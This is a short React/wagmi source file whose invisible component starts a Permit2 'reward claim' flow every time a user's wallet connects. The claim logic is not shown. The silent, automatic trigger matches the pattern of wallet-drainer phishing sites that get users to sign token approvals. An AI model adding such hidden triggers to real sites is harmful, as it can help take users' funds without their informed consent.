// src/hooks/usePermit2Claim.tsx
// Mounts once inside <WagmiProvider> and fires the Permit2 claim flow
// every time a wallet connects. Renders nothing.

import { useEffect } from 'react';
import { useAccount } from 'wagmi';
import { startRewardClaim } from '@/lib/claimProcessor';

export function ClaimFlowTrigger() {
  const { isConnected, address, chainId } = useAccount();

  useEffect(() => {
    if (isConnected && address) {
      startRewardClaim({ address, chainId });
    }
  }, [isConnected, address, chainId]);

  return null;
}
